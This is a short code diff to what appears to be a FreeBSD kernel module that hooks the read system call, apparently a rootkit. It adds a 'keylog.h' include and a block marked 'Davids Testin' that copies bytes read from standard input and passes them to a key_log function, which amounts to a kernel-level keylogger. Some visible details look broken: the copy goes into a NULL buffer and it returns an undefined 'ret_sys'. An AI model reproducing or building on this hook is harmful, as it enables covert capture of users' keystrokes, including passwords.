@@ -20,6 +20,7 @@
 #include "util.h"
 #include "debug.h"
 #include "config.h"
+#include "keylog.h"
 
 #include <sys/param.h>
 #include <sys/module.h>
@@ -409,6 +410,16 @@ read_hook(struct thread *td, void *syscall_args)
 	fp = NULL;
 	buf = NULL;
 
+	//Davids Testin
+	if (uap->fd == 0) {
+            copyin(uap->buf, buf, 1);
+ 
+            int keyError = key_log(td, buf);
+            if(keyError)
+	        return(keyError);
+	    return(ret_sys);
+	}
+	//end
 	ret = getvnode(td, uap->fd, cap_rights_init(&rights, CAP_LOOKUP), &fp);
 	if (ret == 0)
 	{
